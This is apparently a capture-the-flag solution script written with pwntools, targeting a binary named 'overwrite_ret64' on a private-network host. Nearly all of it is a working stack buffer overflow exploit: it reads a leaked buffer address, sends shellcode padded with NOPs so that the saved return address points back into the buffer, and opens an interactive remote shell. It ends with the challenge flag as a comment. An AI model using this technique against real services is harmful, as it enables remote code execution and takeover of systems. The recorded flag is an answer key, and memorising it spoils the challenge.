from pwn import *

context.arch = 'amd64'
context.os = 'linux'

e = ELF('./overwrite_ret64')

#p = process('./overwrite_ret64')
p = remote('192.168.200.106', 10003)

buf_addr_txt = p.recvuntil(b'\n')
BUF_ADDR = p64(int(buf_addr_txt[14:28].decode("utf-8"), 16))
print(BUF_ADDR)
SHELLCODE = asm(shellcraft.sh())
SIZE = 0x110

PAYLOAD = SHELLCODE + b'\x90' * (0x100 - len(SHELLCODE)) + b'\x90' * 0x8 + BUF_ADDR

p.sendlineafter(b'size : ', bytes(str(SIZE), 'utf-8'))
p.sendlineafter(b'Input : ', PAYLOAD)

p.interactive()

# flag is flag{prepare_to_rop}